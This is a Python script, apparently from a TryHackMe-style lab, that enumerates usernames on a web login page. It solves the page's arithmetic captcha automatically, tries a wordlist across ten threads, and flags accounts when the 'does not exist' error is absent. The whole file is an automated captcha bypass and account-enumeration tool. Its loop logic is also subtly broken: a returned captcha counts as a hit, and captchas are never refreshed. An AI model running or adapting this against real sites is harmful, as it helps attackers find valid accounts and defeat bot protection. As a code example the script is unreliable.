import requests
import re
from bs4 import BeautifulSoup
import threading

# URL der Webseite
url = "http://10.10.104.92/login"
file_path = "/home/kali/uebungen/thm/Prioritisev2/usernames.txt"

def getCaptchaSolution(response):
    soup = BeautifulSoup(response.content, 'html.parser')
    equation_pattern = re.compile(r'\s*\d+\s*[-+*/]\s*\d+\s*=\s*\?')
    equation_matches = soup.find_all(string=equation_pattern)

    for equation_text in equation_matches:
        equation_match = re.search(r'(\d+)\s*([-+*/])\s*(\d+)\s*=', equation_text)
        if equation_match:
            num1 = int(equation_match.group(1))
            operator = equation_match.group(2)
            num2 = int(equation_match.group(3))

            if operator == '+':
                result = num1 + num2
            elif operator == '-':
                result = num1 - num2
            elif operator == '*':
                result = num1 * num2
            elif operator == '/':
                result = num1 / num2
            print(f"{num1}{operator}{num2}={result}")
            return str(result)

def check_user(username, captcha):
    post_data = {"username": username, "password": "test", "captcha": captcha}
    response = requests.post(url, data=post_data)

    if "does not exist" not in response.text:
        print(f"User found: {username}")
        return True
    new_captcha = getCaptchaSolution(response)
    return new_captcha

def process_usernames(username_queue, captcha):
    while not username_queue.empty():
        username = username_queue.get()
        if username is None:
            break

        if check_user(username, captcha):
            break

def main():
    post_data = {"username": "admin", "password": "admin"}
    response = requests.post(url, data=post_data)
    captcha = getCaptchaSolution(response)
    print(f"First captcha: {captcha}")

    with open(file_path, 'r') as file:
        lines = file.readlines()

    import queue
    username_queue = queue.Queue()
    for line in lines:
        username_queue.put(line.strip())

    threads = []
    max_threads = 10
    for _ in range(max_threads):
        thread = threading.Thread(target=process_usernames, args=(username_queue, captcha))
        threads.append(thread)
        thread.start()

    for thread in threads:
        username_queue.put(None)  # Signal threads to exit
        thread.join()

if __name__ == "__main__":
    main()
